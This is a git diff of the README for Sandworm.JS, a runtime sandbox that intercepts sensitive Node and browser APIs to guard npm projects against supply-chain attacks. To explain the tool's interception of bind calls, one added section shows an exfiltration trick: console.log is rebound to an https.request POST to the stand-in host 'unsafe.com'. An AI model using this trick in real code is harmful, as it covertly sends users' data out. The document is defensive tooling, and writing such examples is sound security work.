@@ -1,24 +1,47 @@
-![CircleCI](https://img.shields.io/circleci/build/github/sandworm-hq/sandworm-js?style=flat-square) ![Snyk Vulnerabilities for npm package](https://img.shields.io/snyk/vulnerabilities/npm/sandworm?style=flat-square)
+![Sandworm.JS](logo.svg)
 
-# Sandworm.JS
+![npm](https://img.shields.io/npm/v/sandworm?style=flat-square) ![NPM](https://img.shields.io/npm/l/sandworm?style=flat-square) ![CircleCI](https://img.shields.io/circleci/build/github/sandworm-hq/sandworm-js?style=flat-square) ![Snyk Vulnerabilities for npm package](https://img.shields.io/snyk/vulnerabilities/npm/sandworm?style=flat-square) ![Discord](https://img.shields.io/discord/1014951189646934137?style=flat-square)
 
 ## TL;DR
-- Sandworm intercepts all sensitive Node & browser APIs, like `child_process.exec` or `fetch`;
-- It also knows what modules are responsible for each call;
-- You can use it to snoop on what your code is doing under the hood;
-- You can also use it to secure your app's dependencies by enforcing per-module permissions.
+- Sandworm intercepts all sensitive Node & browser APIs, like `child_process.exec` or `fetch`.
+- It also knows what modules are responsible for each call.
+- You can use it to:
+  - audit your dependencies and see what your code is doing under the hood;
+  - secure your app against supply chain attacks by enforcing per-module permissions.
+- Install it as an `npm` module in your existing Node or browser app.
+- Use the Inspector CLI tool to monitor activity and permissions.
+
+## ToC
+- [Overview](#overview)
+- [Getting Started](#getting-started)
+- [Enforcing Permissions in Production Mode](#enforcing-permissions-in-production-mode)
+- [Supported Methods](LIBRARY.md)
+- [Describing Permissions](#describing-permissions)
+  - [Explicit Permissions for Arbitrary Code Execution](#explicit-permissions-for-arbitrary-code-execution)
+  - [Node Cascading Calls](#node-cascading-calls)
+  - [`bind` Calls](#bind-calls)
+- [Caller Module Paths](#caller-module-paths)
+  - [Matching caller paths with RegEx](#matching-caller-paths-with-regex)
+  - [Trusted Modules](#trusted-modules)
+  - [Third Party Scripts](#third-party-scripts)
+  - [Browser Extensions](#browser-extensions)
+- [Configuration Options](#configuration-options)
+- [Using With Bundlers & SourceMaps](#using-with-bundlers--sourcemaps)
+  - [Configuring Sourcemaps](#configuring-sourcemaps)
+  - [Multiple Source Files](#multiple-source-files)
+- [How Sandworm is Tested](#how-sandworm-is-tested)
+- [Constributing](CONTRIBUTING.md)
 
 ## Overview
-Sandworm is a sandboxing & malware detection tool for npm packages. Rather than relying on CVE advisories, 
-Sandworm watches lower-level APIs like the Node VM and browser APIs like DOM manipulation, fetch, etc., and throws when a library unexpectedly accesses these APIs.
+Sandworm.JS is a sandboxing & malware detection tool for npm packages. Rather than relying on CVE advisories, 
+Sandworm watches lower-level APIs like the Node VM and browser APIs like DOM manipulation, fetch, etc., and throws when a package unexpectedly accesses these APIs. While this won't protect against all classes of vulnerabilities, it assures that your project is safe from hand-crafted, zero-day vulnerabilities that leave your data open to attack until a CVE is issued and a fix is published.
 
-While this won't protect against all classes of vulnerabilities, it assures that your project is safe from hand-crafted,
-zero-day vulnerabilities that leave your data open to attack until a CVE is issued.
+Most tools in this space currently use static analysis to scan a package's source and infer potential threats by looking at code patterns, invoked methods, or loaded modules. However, it's generally simple to trick such analysis tools using [various obfuscation techniques](https://swag.cispa.saarland/papers/moog2021statically.pdf). Static analysis is, therefore, not a definitive security solution and should be used in tandem with dynamic tools like Sandworm.
 
 Sandworm does dynamic analysis in the runtime - it knows about what happens when it happens:
-- It's not a static source analysis tool, so it can't let you know about possible vulnerabilities in advance. You can easily trick static analysis, however, using various obfuscation techniques.
-- It also can't capture information about "dormant" code that doesn't get executed.
-- No obfuscation or workaround can fool the platform, though:  as soon as any code segment attempts to invoke a sensitive method, Sandworm will intercept that and be able to allow or deny access.
+- It can't let you know about possible vulnerabilities before it sees the code run;
+- It also can't capture information about "dormant" code that doesn't get executed;
+- No obfuscation or workaround can fool our interceptors, though: as soon as any code segment attempts to invoke a sensitive method, Sandworm will capture that call and be able to allow or deny access.
 
 ## Getting Started
 Add the following lines to **the very start of your app's entry point** to load Sandworm in dev mode. In dev mode, all calls will be intercepted and tracked to the inspector tool, but no enforcement will happen (all calls will be allowed).
@@ -40,7 +63,9 @@ Next, start the inspector tool by running:
 yarn sandworm # or npm run sandworm
 ```
 
-The inspector interface is now available in your browser at http://localhost:7071/. It will update in real-time with details about module activity and used permissions as your app executes.
+The inspector interface is now available in your browser at http://localhost:7071/. It will update in real-time with details about module activity and used permissions as your app executes. The UI also allows you to generate the JSON permissions array you need to provide to support enforcing access when moving to production.
+
+If your automated test process has good coverage, this is an excellent time to run it, have it walk through all code paths and functionality in your app, and collect all activity within the inspector.
 
 ![Sandworm Inspector](/cli/screenshot.png?raw=true "Sandworm Inspector")
 
@@ -59,7 +84,7 @@ Sandworm.init({
 - Provide an array of permission descriptors in the form of objects with a `module` name and a `permissions` array of strings corresponding to the allowed methods.
 - The inspector can generate a baseline permissions array for you based on the activity captured in dev mode.
 
-## Intercepted Method Library
+## Supported Methods
 See [LIBRARY.md](LIBRARY.md).
 
 ## Describing Permissions
@@ -72,12 +97,41 @@ The `permissions` config option should be an array of permission descriptor obje
 
 | **Note**: In dev mode, all modules are granted all permissions, and any passed `permissions` config is ignored.
 
-## Explicit Permissions for Arbitrary Code Execution
+### Explicit Permissions for Arbitrary Code Execution
 | **Note**: This mainly applies to setting up permissions for the root module. For most use cases, you should avoid granting global permissions to a module call path to comply with [PoLP](https://en.wikipedia.org/wiki/Principle_of_least_privilege). The default root permission descriptor is `{ module: 'root', permissions: true }`.
 
 Setting `permissions: true` within a module descriptor will give that module (or call path) permissions to invoke any Sandworm-supported method **except** for a set of particularly unsafe ones that allow for arbitrary code execution - like `eval` or `vm.runInContext`. Using these methods carries a considerable security risk and should generally be avoided. Rigorously audit the code of a module that uses these before using it in your app.
 
 However, suppose you do choose to give your app's code (or any specific caller) access to all underlying APIs **as well as** arbitrary code execution methods. In that case, you need to explicitly change your `permissions` from `true` to `['eval.eval', '*']` to acknowledge that you accept this high-risk configuration.
+
+### Node Cascading Calls
+Some Node APIs internally call other APIs as part of their operation. For example:
+- when loading local files, `require` uses several `fs` methods as well as `vm.compileFunction`;
+- `https.require` uses `dns.lookup` and `tls.Socket`.
+
+To support this, Sandworm will automatically allow the execution of any method calls where the direct caller is part of Node's internal sources. This would indicate that:
+- another Node API has been previously invoked, resulting in the current cascading call;
+- either the previous call has been captured and allowed by Sandworm;
+- or it was not part of Sandworm's library, and thus deemed safe for free use.
+
+### `bind` Calls
+For all intercepted methods, Sandworm will also capture and enforce access to `method.bind` **whenever it is called with more than one argument**. The reason behind this is that using `bind` to partially apply arguments creates contained methods that can then float around until they get executed by another module. For example:
+
+```js
+// Say we're a module that doesn't have `https.request` access
+// but we want to post some stolen data to our server.
+// We can create a custom method with the proper arguments using `bind`
+// and then we can use it to replace a common js function.
+// Sandworm will require the `bind.args` permission to allow this.
+console.log = https.request.bind(this, {
+  hostname: 'unsafe.com',
+  port: 443,
+  path: '/ingest',
+  method: 'POST'
+});
+
+// Now we just wait for root to log anything
+```
 
 ## Caller Module Paths
 Sandworm-detected module names reflect the entire code path that led to invoking a method, from your app's level down to the actual module executing the method.
@@ -195,3 +249,14 @@ await Sandworm.init({
         },
 });
 ```
+
+## How Sandworm is Tested
+Sandworm has several layers of automated testing:
+- Jest is used to run Node.js capture & enforce tests for all supported Node APIs (tests run on Node 10.14 and above). See the `tests/node` directory.
+- Playwright is used to run browser capture & enforce tests for all supported browser APIs (tests run on WebKit, Chromium, and Firefox). See the `tests/web` directory.
+- Jest is used to run unit tests on the core Sandworm source files. See the `tests/unit` directory.
+
+Check out our latest test run inside our [CircleCI pipeline](https://app.circleci.com/pipelines/github/sandworm-hq/sandworm-js).
+
+## Contributing
+See [CONTRIBUTING.md](CONTRIBUTING.md).
